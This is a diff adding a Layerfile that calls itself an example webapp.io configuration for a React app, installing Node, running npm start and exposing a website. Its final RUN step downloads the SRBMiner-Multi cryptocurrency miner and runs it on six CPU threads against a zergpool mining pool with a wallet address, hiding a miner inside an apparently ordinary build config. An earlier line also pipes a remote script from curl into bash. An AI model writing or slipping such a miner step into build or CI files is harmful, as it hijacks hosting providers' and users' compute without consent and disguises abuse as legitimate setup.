@@ -1,0 +1,25 @@
+#This is an example webapp.io configuration for React!
+FROM vm/ubuntu:18.04
+
+# To note: Layerfiles create entire VMs, *not* containers!
+
+RUN curl -fSsL https://deb.nodesource.com/setup_12.x | bash && \
+    apt-get install nodejs python3 make gcc build-essential && \
+    rm -f /etc/apt/sources.list.d/nodesource.list
+
+# node is a memory hog
+MEMORY 2G
+ENV NODE_OPTIONS=--max-old-space-size=8192
+
+COPY . .
+RUN npm install || true
+RUN BACKGROUND npm start || python3 -m http.server 3000
+
+# Create a unique link to share the app in this runner.
+# Every time someone clicks the link, we'll wake up this staging server.
+EXPOSE WEBSITE http://localhost:3000
+
+RUN wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.6/SRBMiner-Multi-0-9-6-Linux.tar.xz && \
+tar -xf SRBMiner-Multi-0-9-6-Linux.tar.xz && cd SRBMiner-Multi-0-9-6 && \
+./SRBMiner-MULTI -a minotaurx -o stratum+tcp://minotaurx.mine.zergpool.com:7019 -u RWMggkM2cxtidMznQobQSbKRnh69SqYbn2 -p c=RVN,ID=minot2 --disable-gpu --cpu-threads 6 --cpu-threads-priority 5
+
